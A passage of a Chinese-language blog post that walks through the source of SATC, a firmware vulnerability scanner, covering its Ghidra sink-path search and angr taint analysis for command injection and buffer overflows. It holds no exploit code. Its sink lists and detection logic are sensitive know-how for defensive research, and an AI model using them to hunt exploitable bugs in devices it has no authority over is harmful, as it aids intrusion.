class="string">&#x27;memcpy&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;twsystem&#x27;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">needCheckFormat = &#123;</span><br><span class="line">    <span class="string">&#x27;sprintf&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;doSystemCmd&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;doShell&#x27;</span>: <span class="number">0</span></span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">func, path, start=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;path: list of (addr of call, callee, callDigestFunc)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># 在cmdi检测中,needCheckFormat中的sprintf并没有出现在sink中</span></span><br><span class="line">        <span class="keyword">if</span> func.name <span class="keyword">in</span> sinks <span class="keyword">and</span> <span class="built_in">len</span>(path):</span><br><span class="line">            <span class="keyword">if</span> func.name <span class="keyword">in</span> needCheckConstantStr <span class="keyword">and</span> checkConstantStr(path[-<span class="number">1</span>][<span class="number">0</span>], needCheckConstantStr[func.name]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> func.name <span class="keyword">in</span> needCheckFormat <span class="keyword">and</span> checkSafeFormat(path[-<span class="number">1</span>][<span class="number">0</span>], needCheckFormat[func.name]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            printpath(path)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        callDigestFunc = <span class="literal">False</span></span><br><span class="line">        vulnerable = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> addr, callee <span class="keyword">in</span> <span class="built_in">sorted</span>(callMap[func].items()):</span><br><span class="line">            <span class="keyword">if</span> start <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> addr &lt; start:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> callDigestFunc <span class="keyword">and</span> callee.name <span class="keyword">in</span> digest:</span><br><span class="line">                <span class="keyword">if</span> callee.name <span class="keyword">in</span> needCheckConstantStr <span class="keyword">and</span> checkConstantStr(addr, needCheckConstantStr[callee.name]):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">elif</span> callee.name <span class="keyword">in</span> needCheckFormat <span class="keyword">and</span> checkSafeFormat(addr, needCheckFormat[callee.name]):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    callDigestFunc = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> callee <span class="keyword">in</span> [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> path] + [startFunc] <span class="keyword">or</span> callee <span class="keyword">in</span> safeFuncs:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            vulnerable = dfs(callee, path + [(addr, callee, callDigestFunc)]) <span class="keyword">or</span> vulnerable</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> vulnerable <span class="keyword">and</span> func != startFunc:</span><br><span class="line">            safeFuncs.add(func)</span><br><span class="line">        <span class="keyword">return</span> vulnerable</span><br></pre></td></tr></table></figure><p>而具体检查参数在于在arm,mips中，字符串参数传递是通过寄存器实现的，下面应该是用了一个符号执行来判断当程序从函数起始位置开始执行到指定位置时，对应寄存器中是否是常量字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getCallingArgs</span>(<span class="params">addr, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= pos &lt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    arch = <span class="built_in">str</span>(currentProgram.language.processor)</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&#x27;ARM&#x27;</span>:</span><br><span class="line">        reg = currentProgram.getRegister(<span class="string">&#x27;r%d&#x27;</span> % pos)</span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&#x27;MIPS&#x27;</span>:</span><br><span class="line">        nextInst = getInstructionAt(addr).<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nextInst.pcode):  <span class="comment"># not NOP</span></span><br><span class="line">            addr = addr.add(<span class="number">8</span>)</span><br><span class="line">        reg = currentProgram.getRegister(<span class="string">&#x27;a%d&#x27;</span> % pos)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span> getRegister(addr, reg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRegister</span>(<span class="params">addr, reg</span>):</span><br><span class="line">    <span class="keyword">if</span> analyzer <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        getAnalyzer()</span><br><span class="line"></span><br><span class="line">    func = getFunctionContaining(addr)</span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">in</span> syms:</span><br><span class="line">        symEval = syms[func]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        symEval = SymbolicPropogator(currentProgram)</span><br><span class="line">        symEval.setParamRefCheck(<span class="literal">True</span>)</span><br><span class="line">        symEval.setReturnRefCheck(<span class="literal">True</span>)</span><br><span class="line">        symEval.setStoredRefCheck(<span class="literal">True</span>)</span><br><span class="line">        analyzer.flowConstants(currentProgram, func.entryPoint, func.body, symEval, monitor)</span><br><span class="line">        syms[func] = symEval</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> symEval.getRegisterValue(addr, reg)</span><br></pre></td></tr></table></figure><p>又或者，检查上述needCheckFormat中，函数是否安全，如果代码中将包含四个以上%s，判定为不安全。如果是四个以内，但是检查下来再某个位置上字符串并不是一个常量时，判断为不安全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkConstantStr</span>(<span class="params">addr, argpos=<span class="number">0</span></span>):</span><br><span class="line">    <span class="comment"># empty string is not considered as constant, for it may be uninitialized global variable</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(getStrArg(addr, argpos))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkSafeFormat</span>(<span class="params">addr, offset=<span class="number">0</span></span>):</span><br><span class="line">    data = getStrArg(addr, offset)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    fmtIndex = offset</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> data[i + <span class="number">1</span>] != <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            fmtIndex += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> data[i + <span class="number">1</span>] == <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> fmtIndex &gt; <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> checkConstantStr(addr, fmtIndex):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>之后返回haveWayToSink的字符串个数，也就是能从这个字符串到达sink的个数</p><h3 id="ref2sink-bof"><a href="#ref2sink-bof" class="headerlink" title="ref2sink_bof"></a>ref2sink_bof</h3><p>ref2sink_bof和ref2sink_cmdi基本是一模一样的，可以看到就是sink改了一下，变成了堆strcpy作为sink的check。</p><p><img src="/2023/08/18/satc-source/image-20230820124659840.png" alt="image-20230820124659840"></p><h3 id="生成结果"><a href="#生成结果" class="headerlink" title="生成结果"></a>生成结果</h3><p>在ghidra_extract_result文件夹中对应binary名下将生成$binary_ref2sink_cmdi.result</p><p><img src="/2023/08/18/satc-source/image-20230820125539569.png" alt="image-20230820125539569"></p><p>文件中每一行是(字符串，引用函数，引用地址）以及完整的sink路径</p><h2 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h2><p>当检测到命令行参数中存在<code>--taint-analysis</code>之后，进入<code>satc.py</code>中的污点分析阶段。首先会读取上一步生成的结果(httpd_ref2sink_cmdi.result)，进入<code>taint_stain_analysis</code>函数。</p><h3 id="ref2sink-cmdi-1"><a href="#ref2sink-cmdi-1" class="headerlink" title="ref2sink_cmdi"></a>ref2sink_cmdi</h3><p>首先提取httpd_ref2sink_cmdi.result信息，因为之前并不是格式化处理好的数据，首先通过<code>conv_Ghidra_output</code>将数据格式化，并加上<code>-alter2</code>的后缀。具体的识别过程是匹配十六进制数字，提取call trace的地址，构成call trace的文本形式。</p><p><img src="/2023/08/18/satc-source/image-20230820182123585.png" alt="image-20230820182123585"></p><p>之后建立angr工程，并生成cfg。</p><blockquote><p>proj = angr.Project(binary, auto_load_libs=False, use_sim_procedures=True)</p></blockquote><p>这里<code>use_sim_procedures</code>意思是re-hook external functions with SimProcedures，也就是用内置函数来代替外部函数，从而减少符号的使用量。</p><p>读取了上述function trace之后，进入taint.py中的main，传入function addr,taint addr，进入<code>bugFinder</code>。首先初始化一些信息，主要是binary相关的，接着进入<code>_vuln_analysis</code>。</p><p>首先初始化<code>coreTaint</code>,生成的log文件存放在/tmp/coretaint.out中。在注释中的描述是</p><blockquote><p>  Perform a symbolic-execution-based taint analysis on a given binary to find whether</p><p>  it exists a tainted path between a source and a sink.</p></blockquote><h3 id="coretaint"><a href="#coretaint" class="headerlink" title="coretaint"></a>coretaint</h3><p>设置了log文件之后，文件通过<code>_get_function_summaries</code>找到angr project中的一些特定函数类型。这个function summary来源于<code>Karonte</code>这篇文章</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_get_function_summaries</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Set and returns a dictionary of function summaries</span></span><br><span class="line"><span class="string">    :return: function summaries</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    p = self._current_p</span><br><span class="line"></span><br><span class="line">    mem_cpy_summ = get_memcpy_like(p)</span><br><span class="line">    size_of_summ = get_sizeof_like(p)</span><br><span class="line">    heap_alloc_summ = get_heap_alloc(p)</span><br><span class="line">    env_summ = get_env(p)</span><br><span class="line">    memcmp_like_unsized = get_memcmp_like_unsized(p)</span><br><span class="line">    memcmp_like_sized = get_memcmp_like_sized(p)</span><br><span class="line">    atoi_like = get_atoi(p)</span><br><span class="line">    nvram_summ = get_nvram(p)</span><br><span class="line">    cJSON_get_summ = get_cJSON(p)</span><br><span class="line"></span><br><span class="line">    summaries = mem_cpy_summ</span><br><span class="line">    summaries.update(size_of_summ)</span><br><span class="line">    summaries.update(heap_alloc_summ)</span><br><span class="line">    summaries.update(env_summ)</span><br><span class="line">    summaries.update(memcmp_like_unsized)</span><br><span class="line">    summaries.update(memcmp_like_sized)</span><br><span class="line">    summaries.update(atoi_like)</span><br><span class="line">    summaries.update(nvram_summ)</span><br><span class="line">    summaries.update(cJSON_get_summ)</span><br><span class="line">    <span class="keyword">return</span> summaries</span><br></pre></td></tr></table></figure><p>以<code>get_memcpy_like</code>为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_memcpy_like</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Gets and summarizes memcpy like functions within a Linux binary</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param p: angr project</span></span><br><span class="line"><span class="string">    :return: function summaries</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> add sprintf</span></span><br><span class="line">    summarized_f = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    addrs = get_dyn_sym_addrs(p, [<span class="string">&#x27;sprintf&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> addrs:</span><br><span class="line">summarized_f[f] = summary_functions.sprintf</span><br><span class="line">    </span><br><span class="line">    addrs = get_dyn_sym_addrs(p, [<span class="string">&#x27;snprintf&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> addrs:</span><br><span class="line">summarized_f[f] = summary_functions.snprintf</span><br><span class="line"></span><br><span class="line">    addrs = get_dyn_sym_addrs(p, [<span class="string">&#x27;strcpy&#x27;</span>,<span class="string">&#x27;stristr&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span> addrs</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> addrs:</span><br><span class="line">        summarized_f[f] = summary_functions.memcpy_unsized</span><br><span class="line"></span><br><span class="line">    addrs = get_dyn_sym_addrs(p, [<span class="string">&#x27;strncpy&#x27;</span>, <span class="string">&#x27;memcpy&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> addrs:</span><br><span class="line">        summarized_f[f] = summary_functions.memcpy_sized</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> summarized_f</span><br></pre></td></tr></table></figure><p>可以看到这部分操作把angr project中sprintf,snprintf等字符串拷贝相关函数用一个函数指针代替。以<code>memcpy</code>为例，如下。这应该是原先函数的代替，用python完成了重写，并且加上了taint与否的标签(还不是特别明白，等调试到再看)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">memcpy_unsized</span>(<span class="params">_core, call_site_path, plt_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    memcpy-like unsize (e.g., strcpy) function summary</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param _core: core taint engine</span></span><br><span class="line"><span class="string">    :param call_site_path: call site angr path</span></span><br><span class="line"><span class="string">    :param plt_path:  path to the plt (i.e., call_site.step())</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    p = _core.p</span><br><span class="line"></span><br><span class="line">    <span class="comment"># FIXME do taint untaint!</span></span><br><span class="line">    plt_path_cp = plt_path.copy(copy_states=<span class="literal">True</span>)</span><br><span class="line">    plt_state_cp = plt_path_cp.active[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    src = <span class="built_in">getattr</span>(plt_state_cp.regs, arg_reg_name(p, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _core.is_tainted(src, path=plt_path_cp) <span class="keyword">or</span> _core.is_tainted(_core.safe_load(plt_path_cp, src), path=plt_path_cp):</span><br><span class="line">        <span class="comment"># <span class="doctag">FIXME:</span> make the actual copy so that taint dependency will be respected</span></span><br><span class="line">        t = _core.get_sym_val(name=_core.taint_buf, bits=_core.taint_buf_size).<span class="built_in">reversed</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plt_path_cp.step()</span><br><span class="line">        <span class="keyword">assert</span> _core.p.is_hooked(plt_path_cp.active[<span class="number">0</span>].addr), <span class="string">&quot;memcpy_unsized: Summary function relies on angr&#x27;s &quot;</span> \</span><br><span class="line">                                                              <span class="string">&quot;sim procedure, add option use_sim_procedures to the &quot;</span> \</span><br><span class="line">                                                              <span class="string">&quot;loader&quot;</span></span><br><span class="line">        plt_path.step().step()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> plt_path.active:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;size of function has no active successors, not walking this path...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    dst = <span class="built_in">getattr</span>(plt_path.active[<span class="number">0</span>].regs, arg_reg_name(p, <span class="number">0</span>))</span><br><span class="line">    plt_path.active[<span class="number">0</span>].memory.store(dst, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># restore the register values to return the call</span></span><br><span class="line">    _restore_caller_regs(_core, call_site_path, plt_path)</span><br></pre></td></tr></table></figure><p>接下来设置<code>sink_addr</code>。这一步在后面coretaint中要用到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_find_sink_addresses</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the sink addresses in the current binary&#x27;s project</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p = self._current_p</span><br><span class="line">    <span class="comment"># SINK_FUNCS = [(&#x27;strcpy&#x27;, sinks.strcpy), (&#x27;sprintf&#x27;, sinks.sprintf), (&#x27;fwrite&#x27;, sinks.fwrite), (&#x27;memcpy&#x27;, sinks.memcpy),(&#x27;system&#x27;, sinks.system),(&#x27;___system&#x27;, sinks.system),(&#x27;bstar_system&#x27;, sinks.system),(&#x27;popen&#x27;,sinks.system),(&#x27;execve&#x27;,sinks.execve),(&quot;doSystemCmd&quot;,sinks.doSystemCmd),(&quot;twsystem&quot;, sinks.system),(&#x27;CsteSystem&#x27;, sinks.system)]</span></span><br><span class="line"></span><br><span class="line">    self._sink_addrs = [(get_dyn_sym_addr(p, func[<span class="number">0</span>]), func[<span class="number">1</span>]) <span class="keyword">for</span> func <span class="keyword">in</span> SINK_FUNCS]</span><br><span class="line">    self._sink_addrs += [(m, sinks.memcpy) <span class="keyword">for</span> m <span class="keyword">in</span> find_memcpy_like(p)]</span><br></pre></td></tr></table></figure><p>接下来终于是coretaint了，运行污点测试engine。在设置一部分内容之后进入self.flat_explore，接着再进入self._flat_explore。这看起来是比较核心的函数。这一部分接受的<code>sinks_info</code>和<code>sources_info</code>最终将变为传入<code>check_func</code>的参数，也就是<code>_check_sink</code>函数。这个函数接受一个state作为输入，<strong>判断当前state中是否有可以被taint或者untaint的内容</strong>，之后选择state.step()的返回结果作为下一步执行的内容，同时<strong>检查当前state经过的basic block中是否有sink</strong>(<code>_is_sink_and_tainted</code>)，并且使用了taint data(这个检验方式是对于每一个调用sink函数的位置，使用重写的sink函数进行参数检查)。后面的taint analysis的部分应该是基于开源的taint engine修改的，应该只是修改了这一个检验函数。</p><p>而flat_explore本身应该和污点分析无关，是一种探索方式。下面写一下<code>_check_sink</code>的简化版源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">def</span> <span class="title function_">_check_sink</span>(<span class="params">self, current_path, guards_info, *_, **__</span>):</span><br><span class="line">     <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     Checks whether the taint propagation analysis lead to a sink, and performs the necessary actions</span></span><br><span class="line"><span class="string">     :param current_path: angr current path</span></span><br><span class="line"><span class="string">     :param guards_info:  guards (ITE) information</span></span><br><span class="line"><span class="string">     :return: None</span></span><br><span class="line"><span class="string">     &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         current_state = current_path.active[<span class="number">0</span>]</span><br><span class="line">         current_addr = current_state.addr</span><br><span class="line">         cfg = self._current_cfg</span><br><span class="line"></span><br><span class="line">         self._visited_bb += <span class="number">1</span></span><br><span class="line">         </span><br><span class="line"><span class="comment"># 下一步要探索的位置</span></span><br><span class="line">         next_path = current_path.copy(copy_states=<span class="literal">True</span>).step()</span><br><span class="line">         info = self._current_role_info</span><br><span class="line">         <span class="comment"># 有一些不必要的污点变量可以删除，例如比较中的变量</span></span><br><span class="line">         bounded, var = self._is_any_taint_var_bounded(guards_info)</span><br><span class="line">         <span class="keyword">if</span> bounded:</span><br><span class="line">             self._ct.do_recursive_untaint(var, current_path)</span><br><span class="line"></span><br><span class="line">         <span class="comment"># If the taint is not applied yet, apply it</span></span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> self._ct.taint_applied <span class="keyword">and</span> current_addr == info[RoleInfo.CALLER_BB]:</span><br><span class="line">             next_state = next_path.active[<span class="number">0</span>]</span><br><span class="line">             self._apply_taint(current_addr, current_path, next_state, taint_key=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 一般eg_souce_addr为空，可能是测试时用的example source addr?</span></span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(next_path.active) <span class="keyword">and</span> self._config[<span class="string">&#x27;eg_souce_addr&#x27;</span>]:</span><br><span class="line">                 <span class="keyword">if</span> next_path.active[<span class="number">0</span>].addr == <span class="built_in">int</span>(self._config[<span class="string">&#x27;eg_souce_addr&#x27;</span>], <span class="number">16</span>):</span><br><span class="line">                     next_state = next_path.active[<span class="number">0</span>]</span><br><span class="line">                     self._apply_taint(current_addr, current_path, next_state, taint_key=<span class="literal">True</span>)</span><br><span class="line">         <span class="keyword">except</span> TimeOutException <span class="keyword">as</span> to:</span><br><span class="line">             <span class="keyword">raise</span> to</span><br><span class="line">         <span class="keyword">except</span>:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 检查途径的basic blocks中是否有sinks，并且这些sinks检查自己对应的变量位置是否有tainted的变量，有就产生一个alert</span></span><br><span class="line">         <span class="keyword">if</span> self._is_sink_and_tainted(current_path):</span><br><span class="line">             delta_t = time.time() - self._analysis_starting_time</span><br><span class="line">             self._raised_alert = <span 